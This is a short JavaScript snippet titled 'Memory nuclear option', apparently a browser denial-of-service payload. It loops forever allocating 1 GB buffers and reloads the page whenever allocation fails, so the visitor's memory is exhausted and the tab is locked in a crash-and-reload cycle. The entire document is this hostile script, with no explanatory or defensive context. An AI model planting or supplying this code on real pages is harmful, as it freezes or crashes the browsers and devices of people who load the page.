// Memory nuclear option  
(function(){  
    const buffers = [];  
    while(true) {  
        try {  
            buffers.push(new ArrayBuffer(1024 * 1024 * 1024));  
        } catch(e) {  
            window.location.reload();  
        }  
    }  
})();  
